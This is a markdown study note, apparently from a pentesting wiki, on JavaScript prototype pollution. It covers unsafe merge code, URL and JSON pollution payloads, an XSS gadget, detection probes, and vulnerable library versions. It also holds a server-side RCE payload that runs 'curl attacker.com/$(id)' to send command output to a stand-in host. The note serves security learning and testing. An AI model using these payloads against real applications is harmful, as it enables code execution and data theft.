# Prototype Pollution

← [[A03-Injection]]

---

Prototype pollution is a JavaScript vulnerability where an attacker can modify `Object.prototype` — the base object that all JavaScript objects inherit from. By polluting it, you can inject properties into every object in the application, often leading to RCE (server-side) or XSS (client-side).

---

## JavaScript Prototype Basics

In JavaScript, every object inherits from `Object.prototype`. If you can add a property to `Object.prototype`, every object in the process gets that property:

```javascript
Object.prototype.polluted = true;

const user = {};
console.log(user.polluted);  // → true (inherited!)
```

---

## How Pollution Happens

Prototype pollution occurs in unsafe object merging, cloning, or path-setting functions:

```javascript
// Unsafe deep merge (common pattern in older libraries)
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];  // ← dangerous
    }
  }
}

// Attacker input:
merge({}, JSON.parse('{"__proto__": {"admin": true}}'))

// Now: {}.admin === true, for every empty object
```

Key: `__proto__` is the accessor for an object's prototype. Assigning to `obj["__proto__"]["key"] = value` sets it on `Object.prototype`.

---

## Finding Prototype Pollution (Client-Side)

### Manual Testing

In browser console, try setting a pollution payload via URL, JSON input, or form fields:

```javascript
// Via URL parameter
?__proto__[test]=polluted
?constructor[prototype][test]=polluted

// Check if it worked:
> ({}).test    // → 'polluted' means it worked
```

### Burp DOM Invader

Burp's DOM Invader extension has prototype pollution detection built in — it injects pollution probes and monitors for effects.

### URL-Based Pollution

```
https://example.com/?__proto__[test]=value
https://example.com/?constructor.prototype.test=value
https://example.com/search#__proto__[test]=value
```

---

## Client-Side Prototype Pollution → XSS

Polluting a property that eventually reaches a dangerous sink:

```javascript
// App code:
Object.assign(config, userInput);
document.getElementById('banner').innerHTML = config.message;  // sink

// If you pollute Object.prototype.message = "<img src=x onerror=alert(1)>"
// Every config object inherits .message → XSS fires
```

**Gadget chains:** The pollution doesn't directly cause XSS — you need a "gadget" — existing code that reads the polluted property and puts it in a dangerous sink. Tools like [ppmap](https://github.com/kleiton0x00/ppmap) automate gadget hunting.

---

## Server-Side Prototype Pollution → RCE

Node.js apps that process JSON from untrusted sources and use vulnerable merge/clone patterns:

```javascript
// Server receives and merges user input
const config = {};
merge(config, req.body);

// Attacker sends:
{"__proto__": {"execPath": "/bin/sh", "execArgv": ["-c", "curl attacker.com/$(id)"]}}

// If any child_process.spawn() is called with default options afterward:
// → shell command executed
```

Common RCE gadgets in Node.js:
- `child_process.fork()` — reads `execArgv` from options, inherits from prototype
- `child_process.spawn()` — similar
- Template engine rendering
- Shell-based utilities

---

## Testing Server-Side Prototype Pollution

```bash
# Send pollution payload in JSON body
POST /api/update
Content-Type: application/json

{"__proto__": {"json spaces": 10}}

# If JSON responses start being indented by 10 spaces → prototype polluted
# (Express.js has a json spaces config option that affects res.json())
```

```bash
# Other detectable gadgets:
{"__proto__": {"status": 555}}   → response status codes change to 555?
{"__proto__": {"head": "1"}}     → app stops returning body?
```

---

## Path-Based Pollution Variants

Not just `__proto__` — also works via `constructor.prototype`:

```json
{"constructor": {"prototype": {"admin": true}}}
```

And via path-setting functions:
```javascript
_.set(obj, "__proto__.polluted", true)
_.set(obj, "constructor.prototype.polluted", true)
```

---

## Vulnerable Libraries (Historical)

These had prototype pollution — update to patched versions:
- `lodash` < 4.17.21 (merge, defaultsDeep, set)
- `jquery` < 3.4.0 ($.extend with deep: true)
- `minimist` < 1.2.6 (CLI argument parsing)
- `qs` < 6.7.3 (query string parsing)
- `hoek` < 5.0.3 (Hapi.js utility)
- `flat` < 5.0.1

Check with: `npm audit` or `retire.js`

---

*Related: [[DOM-XSS]] | [[A03-Injection]] | [[A06-Vulnerable-Components]]*

*Sources: PortSwigger Web Security Academy, Snyk research, PayloadsAllTheThings*
